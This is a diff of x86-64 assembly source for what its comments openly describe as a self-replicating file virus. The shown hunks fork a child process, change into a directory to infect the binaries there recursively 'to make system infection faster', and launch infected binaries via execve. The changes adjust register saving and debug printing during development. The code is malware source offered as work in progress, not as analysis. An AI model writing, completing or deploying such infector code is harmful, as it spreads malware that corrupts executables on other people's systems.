@@ -530,12 +530,20 @@ retn
 ;that infected binary will then infect recursively everything else from it's own directory (.) ownards
 ;this will make system infection faster
 handle_dir:
+	push rdi
+	push rsi
+	push rdx
+	push r10
+	push rcx
+	push r8
+
 	mov rax, 57
 	syscall; rax = fork()
 	cmp rax, 0
 	jne hd_parent
 	mov rax, 80
 	call ft_puts
+	call debug
 	syscall;chdir(fname);
 	push 0x0000002e; our target directory here "."
 	lea rdi, [rsp]	
@@ -544,11 +552,7 @@ handle_dir:
 	;infect directory here
 	jmp exit_prog
 	hd_parent:
-	push rdi
-	push rsi
-	push rdx
-	push r10
-	push rcx
+
 	;wait for child
 	mov rdi, rax; pid
 	mov rax, 61; sys_wait4
@@ -557,6 +561,7 @@ handle_dir:
 	mov r10, 0
 	syscall; wait4(pid, NULL, 0, NULL); we wait for child to finish
 	;pop and return
+	pop r8
 	pop rcx
 	pop r10
 	pop rdx
@@ -623,7 +628,7 @@ retn
 ;void launch_infected(char *fname)
 ;basically execve(fname, {fname, NULL}, {NULL});
 launch_infected:
-	call ft_puts
+;	call ft_puts
 	sub rsp, 16; {fname, NULL}
 
 	mov QWORD[rsp], rdi
